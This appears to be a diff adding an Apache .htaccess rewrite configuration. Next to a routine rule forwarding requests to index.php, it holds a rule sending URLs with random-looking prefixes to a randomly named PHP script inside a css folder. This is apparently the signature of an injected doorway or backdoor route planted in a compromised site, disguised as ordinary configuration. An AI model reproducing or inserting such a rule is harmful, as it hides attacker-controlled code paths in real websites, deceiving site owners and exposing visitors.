@@ -1,0 +1,15 @@
+  <IfModule mod_rewrite.c>
+Options +FollowSymLinks
+IndexIgnore */*
+RewriteEngine on
+RewriteCond %{QUERY_STRING} ^(.*)$
+RewriteRule ^(tieiwfc|rpkngpq|zmbkap)(.*)$ /css/wcfknd.php?st=$1&path=$1$2 [L]
+
+
+# if a directory or a file exists, use it directly  
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+# otherwise forward it to index.php  
+RewriteRule . index.php
+</IfModule>
